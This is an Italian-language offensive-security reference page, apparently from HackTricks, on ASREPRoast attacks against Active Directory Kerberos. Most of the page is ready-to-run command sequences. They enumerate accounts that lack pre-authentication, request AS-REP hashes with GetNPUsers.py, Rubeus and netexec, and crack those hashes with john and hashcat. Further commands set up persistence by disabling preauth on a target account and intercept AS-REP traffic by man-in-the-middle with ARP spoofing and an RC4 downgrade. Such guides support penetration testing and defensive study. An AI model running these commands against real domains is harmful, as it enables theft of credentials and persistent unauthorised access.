# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast è un attacco di sicurezza che sfrutta utenti che non hanno il **Kerberos pre-authentication required attribute**. Essenzialmente, questa vulnerabilità permette agli attacker di richiedere l'autenticazione per un utente al Domain Controller (DC) senza avere la password dell'utente. Il DC risponde con un messaggio crittografato con la chiave derivata dalla password dell'utente, che gli attacker possono tentare di crackare offline per scoprire la password dell'utente.

I requisiti principali per questo attacco sono:

- **Lack of Kerberos pre-authentication**: Gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
- **Connection to the Domain Controller (DC)**: Gli attacker necessitano di accesso al DC per inviare richieste e ricevere messaggi cifrati.
- **Optional domain account**: Avere un account di dominio permette agli attacker di identificare più efficacemente gli utenti vulnerabili tramite query LDAP. Senza tale account, gli attacker devono indovinare gli username.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Richiedi il messaggio AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus genererà un 4768 con un encryption type di 0x17 e preauth type di 0.

#### Comandi rapidi (Linux)

- Esegui prima l'enumerazione dei potenziali target (es., da leaked build paths) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Recupera l'AS-REP di un singolo utente anche con una **blank** password usando `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec stampa anche la postura di LDAP signing/channel binding).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – rileva automaticamente **-m 18200** (etype 23) per gli AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistenza

Forzare che **preauth** non sia richiesto per un utente per il quale si hanno permessi **GenericAll** (o permessi di scrittura delle proprietà):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast senza credenziali

Un attaccante può usare una posizione man-in-the-middle per catturare pacchetti AS-REP mentre attraversano la rete senza fare affidamento sul fatto che la pre-authentication Kerberos sia disabilitata. Di conseguenza funziona per tutti gli utenti sulla VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci permette di farlo. Inoltre, lo strumento forza i client workstations a usare RC4 alterando la Kerberos negotiation.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
